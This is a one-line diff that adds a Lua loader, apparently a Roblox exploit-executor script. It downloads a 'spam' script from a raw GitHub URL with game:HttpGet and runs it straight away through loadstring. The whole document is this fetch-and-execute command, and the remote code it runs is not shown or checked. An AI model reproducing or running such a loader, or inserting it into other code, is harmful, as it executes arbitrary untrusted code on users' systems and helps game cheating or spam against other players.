@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/spectershapecabin/loaders/main/loaders/makeup-star-spam3-rmsicugth0l0mn.lua"))()
